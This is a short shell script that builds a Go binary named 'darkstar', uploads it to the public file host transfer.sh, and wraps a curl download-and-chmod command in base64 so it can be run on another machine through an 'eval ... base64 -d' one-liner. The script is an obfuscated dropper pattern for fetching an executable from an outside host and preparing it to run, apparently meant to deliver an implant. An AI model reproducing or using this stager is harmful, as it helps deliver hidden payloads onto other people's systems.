go build
uploadstring=`curl --upload-file ./darkstar https://transfer.sh/darkstar`
echo "curl -L $uploadstring >> darkstar && chmod +x darkstar" | base64 -w 0
printf "\n"
echo "eval echo ENCODED_STRING | base64 -d"
#eval echo "" | base64 -d
